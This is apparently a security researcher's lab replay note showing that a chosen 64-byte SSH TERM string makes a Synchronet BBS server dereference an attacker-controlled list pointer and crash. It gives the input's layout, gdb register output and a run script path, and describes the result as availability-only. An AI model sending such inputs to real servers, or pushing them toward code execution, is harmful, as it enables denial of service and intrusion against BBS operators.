# Replay — W24 fault-address lane (2026-11-25 12:52Z, author)

One bounded counterexample lane for W21: is the SIGSEGV at
`link_list.c:78` really the dereference of the attacker-chosen
`savedlines.first`, not unrelated list state?

One command from the repo root, loopback only, using the already-provisioned
pinned `db9c5d6f` build:

```
bash lab/frontier/synchronet2shell/release-label/term320b/real320b/run-faultaddr320b.sh
```

Expected: `RESULT: PASS=7 FAIL=0`, rc 0. Observed at 12:52:54Z: 7 PASS / 0
FAIL, rc 0, per-PID port 24471. The same 64-byte chosen TERM
(41×A, 3×B, `MISHE-OOTAUFTAUF`, 4×Z) is sent by an OpenSSH `none` client to a
real `sbbs_t::answer()`; the probe is instrumentation-only and `answer.cpp`
is restored on exit.

Raw lines (`evidence/gdb-faultaddr.log`, sha256
`62898623a3a46fab4df26df90d7b52cdfb051c97f41ef20b386e40d8d89b9b75`):

```
REAL_320B_PROBE sizeof=41 l=64 off41=42 cv=4853494d first=0x465541544f4f2d45 last=0x5a5a5a5a46554154
Node 1 destructor begin
Thread 9 "sbbs/termNode" received signal SIGSEGV, Segmentation fault.
0x00007ffff6f5e053 in listFreeNodes (list=0x7fffe40b6890) at link_list.c:78
78		if(node->flags&LINK_LIST_LOCKED)
W24_SI_ADDR=(nil)
W24_SIGINFO=Value can't be converted to integer.
=> 0x7ffff6f5e053 <listFreeNodes+67>:	mov    0x20(%rax),%rax
rax            0x465541544f4f2d45  5068028786039008581
W24_LIST_FIRST=0x465541544f4f2d45
W24_NODE=0x465541544f4f2d45
W24_FLAGS_OFFSET=0x20
```

## Negative, preserved

gdb's `$_siginfo._sifields._sigfault.si_addr` reads `(nil)` at this threaded
SIGSEGV stop and `$_siginfo` is not convertible to an integer, so the direct
`si_addr` cross-check fails. No retrial into existence: the dereference is
proved instead from the faulting instruction `mov 0x20(%rax),%rax` with
`rax = 0x465541544f4f2d45` (the probe's chosen `savedlines.first`) and
`offsetof(list_node_t, flags) = 0x20`. The implied dereference address is
`0x465541544f4f2d45 + 0x20 = 0x465541544f4f2d65`, an unmapped address.

## Ceiling

This closes one W21 counterexample at the rung-4 pointer-consumer scope: the
faulting load uses the wire-chosen pointer exactly. It does not add pointer/IP
control to a useful target, command execution, a measured DoS rate or r5. The
advisory remains availability-only. Author replay, not a witness verdict;
witness replay of W21/W22/W23 is still owed.
